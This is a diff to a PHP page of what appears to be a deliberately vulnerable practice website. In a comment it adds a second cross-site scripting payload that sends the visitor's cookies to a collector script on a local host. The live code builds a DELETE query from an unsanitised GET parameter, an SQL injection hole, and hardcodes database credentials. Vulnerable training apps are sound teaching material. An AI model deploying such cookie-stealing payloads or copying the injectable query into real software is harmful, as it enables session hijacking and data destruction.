@@ -15,9 +15,15 @@ var http = new XMLHttpRequest();
 http.open(\'GET\', \'http://192.168.161.128/~janjaap/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
 http.send(null);
 </script>
+<script>
+var http = new XMLHttpRequest();
+http.open(\'GET\', \'http://localhost:8888/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
+http.send(null);
+</script>
+
  */
 
-$link = mysqli_connect("localhost", "pipo", "declown", "vulnerable_db");
+$link = mysqli_connect("localhost:3306", "pipo", "declown", "vulnerable_db");
 
 if(isset($_GET['action']) && $_GET['action'] == "delete" && !empty($_GET['id'])) {
     $query = "DELETE FROM user WHERE iduser = ".$_GET['id'];
@@ -31,6 +37,7 @@ if (!mysqli_query($link, $query)) {
     printf("Errormessage: %s\n", mysqli_error($link));
 }
 
+include("../layout/header.php");
 include("nav.php");
 
 while($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
@@ -42,3 +49,4 @@ while($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
 <script>
     //console.log(document.cookie);
 </script>
+<?php include("../layout/footer.php"); ?>
